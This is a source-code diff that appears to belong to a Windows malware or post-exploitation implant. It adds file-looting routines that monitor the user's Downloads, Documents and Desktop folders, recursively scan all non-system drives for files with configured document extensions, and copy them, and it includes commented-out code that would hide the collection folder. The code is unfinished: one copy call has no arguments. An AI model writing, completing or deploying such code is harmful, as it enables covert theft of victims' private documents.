@@ -94,6 +94,23 @@ VOID FreeGlobalConfig
 			CloseHandle(pConfig->hCurrentToken);
 		}
 		
+		if (pConfig->DocumentExtensions != NULL) {
+			for (i = 0; i < pConfig->cDocumentExtensions; i++) {
+				FREE(pConfig->DocumentExtensions[i]);
+			}
+
+			FREE(pConfig->DocumentExtensions);
+		}
+
+		if (pConfig->ArchiveExtensions != NULL) {
+			for (i = 0; i < pConfig->cArchiveExtensions; i++) {
+				FREE(pConfig->ArchiveExtensions[i]);
+			}
+
+			FREE(pConfig->ArchiveExtensions);
+		}
+		
+		
 		FREE(pConfig);
 	}
 }
@@ -1366,7 +1383,109 @@ VOID FreePivotProfile
 {
 	if (pProfile != NULL) {
 		FREE(pProfile->lpBindAddress);
-
 		FREE(pProfile);
+	}
+}
+
+BOOL LootFileCallback
+(
+	_In_ PFILE_NOTIFY_INFORMATION pNotifyInfo,
+	_In_ LPWSTR lpPath,
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	PrintFormatW(L"%s\n", lpPath);
+	return FALSE;
+}
+
+VOID LootFileThread
+(
+	_In_ PLOOT_ARGS pParateter
+)
+{
+	WatchFileModificationEx(pParateter->lpPath, TRUE, LootFileCallback, pParateter->pConfig);
+CLEANUP:
+	if (pParateter != NULL) {
+		FREE(pParateter->lpPath);
+		FREE(pParateter);
+	}
+
+	return;
+}
+
+BOOL StealFileCallback
+(
+	_In_ LPWSTR lpPath,
+	_In_ PGLOBAL_CONFIG pConfig 
+)
+{
+	DWORD i = 0;
+	LPWSTR lpExtension = NULL;
+
+	lpExtension = PathFindExtensionW(lpPath);
+	if (lpExtension[0] != L'\0') {
+		for (i = 0; i < pConfig->cDocumentExtensions; i++) {
+			if (!lstrcmpiW(lpExtension, pConfig->DocumentExtensions[i])) {
+				CopyFileW()
+			}
+		}
+	}
+	
+
+	return FALSE;
+}
+
+VOID LootFile
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	DWORD dwThreadID = 0;
+	PLOOT_ARGS pLootParameter = NULL;
+	WCHAR wszLogicalDrives[0x100];
+	WCHAR wszSystem32[MAX_PATH];
+	LPWSTR lpTemp = NULL;
+
+	/*CreateDirectoryW(pConfig->wszWarehouse, NULL);
+	SetFileAttributesW(pConfig->wszWarehouse, FILE_ATTRIBUTE_HIDDEN);
+	SetFileAttributesW(pConfig->wszWarehouse, FILE_ATTRIBUTE_SYSTEM);*/
+	pLootParameter = ALLOC(sizeof(LOOT_ARGS));
+	pLootParameter->lpPath = ALLOC(MAX_PATH * sizeof(WCHAR));
+	pLootParameter->pConfig = pConfig;
+	ExpandEnvironmentStringsW(L"%USERPROFILE%\\Downloads", pLootParameter->lpPath, MAX_PATH);
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFileThread, pLootParameter, 0, &dwThreadID);
+
+	pLootParameter = ALLOC(sizeof(LOOT_ARGS));
+	pLootParameter->lpPath = ALLOC(MAX_PATH * sizeof(WCHAR));
+	pLootParameter->pConfig = pConfig;
+	ExpandEnvironmentStringsW(L"%USERPROFILE%\\Documents", pLootParameter->lpPath, MAX_PATH);
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFileThread, pLootParameter, 0, &dwThreadID);
+
+	pLootParameter = ALLOC(sizeof(LOOT_ARGS));
+	pLootParameter->lpPath = ALLOC(MAX_PATH * sizeof(WCHAR));
+	pLootParameter->pConfig = pConfig;
+	if (SHGetSpecialFolderPathW(NULL, pLootParameter->lpPath, CSIDL_DESKTOP, FALSE)) {
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFileThread, pLootParameter, 0, &dwThreadID);
+	}
+	else {
+		FREE(pLootParameter->lpPath);
+		FREE(pLootParameter);
+	}
+
+	SecureZeroMemory(wszLogicalDrives, sizeof(wszLogicalDrives));
+	GetLogicalDriveStringsW(_countof(wszLogicalDrives), wszLogicalDrives);
+	lpTemp = wszLogicalDrives;
+	GetSystemDirectoryW(wszSystem32, _countof(wszSystem32));
+	while (TRUE) {
+		if (lpTemp[0] == L'\0') {
+			break;
+		}
+
+		if (IsStrStartsWithW(wszSystem32, lpTemp)) {
+			lpTemp += lstrlenW(lpTemp) + 1;
+			continue;
+		}
+
+		ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFileCallback, pConfig);
 	}
 }
